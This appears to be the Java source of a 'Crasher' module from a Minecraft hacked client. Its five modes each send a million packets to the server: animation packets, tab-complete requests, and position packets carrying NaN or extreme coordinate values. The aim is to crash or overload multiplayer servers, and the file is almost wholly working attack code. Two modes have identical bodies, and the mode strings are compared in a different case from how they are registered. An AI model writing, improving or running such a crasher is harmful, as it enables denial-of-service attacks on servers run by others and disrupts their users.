package de.crazymemecoke.features.modules.exploits;

import de.crazymemecoke.Client;
import de.crazymemecoke.manager.clickguimanager.settings.Setting;
import de.crazymemecoke.manager.modulemanager.Category;
import de.crazymemecoke.manager.modulemanager.Module;
import net.minecraft.network.play.client.C0APacketAnimation;
import net.minecraft.network.play.client.C14PacketTabComplete;
import org.lwjgl.input.Keyboard;

import java.util.ArrayList;

import static net.minecraft.network.play.client.C03PacketPlayer.C04PacketPlayerPosition;
import static net.minecraft.network.play.client.C03PacketPlayer.C06PacketPlayerPosLook;

public class Crasher extends Module {

    ArrayList<String> mode = new ArrayList<>();

    public Crasher() {
        super("Crasher", Keyboard.KEY_NONE, Category.EXPLOITS, -1);

        mode.add("PacketAnimation");
        mode.add("TabComplete");
        mode.add("PlayerPosition");
        mode.add("PlayerPosLook-1");
        mode.add("PlayerPosLook-2");

        Client.main().setMgr().newSetting(new Setting("Mode", this, "PacketAnimation", mode));
    }

    @Override
    public void onUpdate() {
        String mode = Client.main().setMgr().settingByName("Mode", this).getMode();

        if (getState()) {
            switch (mode) {
                case "packetanimation": {
                    doPacketAnimation();
                    break;
                }
                case "tabcomplete": {
                    doTabComplete();
                    break;
                }
                case "playerposition": {
                    doPlayerPosition();
                    break;
                }
                case "playerposlook-1": {
                    doPlayerPosLook1();
                    break;
                }
                case "playerposlook-2": {
                    doPlayerPosLook2();
                    break;
                }
            }
        }
    }

    private void doPlayerPosLook2() {
        int x = 1;
        int y = 1;
        int z = 1;
        for (int i = 0; i < 1000000; i++) {
            x += 999 * Math.random();
            z += 999 * Math.random();
            y += mc.thePlayer.motionY;

            mc.thePlayer.sendQueue.addToSendQueue(new C06PacketPlayerPosLook(x, y, z,
                    (float) (mc.thePlayer.rotationYaw + Math.random()),
                    (float) (mc.thePlayer.rotationPitch + Math.random()), false));
        }
    }

    private void doPlayerPosLook1() {
        for (int i = 0; i < 1000000; i++) {
            mc.thePlayer.sendQueue.addToSendQueue(
                    new C04PacketPlayerPosition(Double.NaN, Double.NaN, Double.NaN, Boolean.TRUE));
            mc.thePlayer.sendQueue.addToSendQueue(new C04PacketPlayerPosition(Double.MAX_VALUE,
                    Double.MIN_VALUE, Double.MAX_VALUE, Boolean.TRUE));
        }
    }

    private void doPlayerPosition() {
        for (int i = 0; i < 1000000; i++) {
            mc.thePlayer.sendQueue.addToSendQueue(
                    new C04PacketPlayerPosition(Double.NaN, Double.NaN, Double.NaN, Boolean.TRUE));
            mc.thePlayer.sendQueue.addToSendQueue(new C04PacketPlayerPosition(Double.MAX_VALUE,
                    Double.MIN_VALUE, Double.MAX_VALUE, Boolean.TRUE));
        }

    }

    private void doTabComplete() {
        for (int i = 0; i < 1000000; i++) {
            mc.thePlayer.sendQueue.addToSendQueue(new C14PacketTabComplete("/"));
        }
    }

    private void doPacketAnimation() {
        for (int i = 0; i < 1000000; i++) {
            mc.thePlayer.sendQueue.addToSendQueue(new C0APacketAnimation());
        }
    }
}
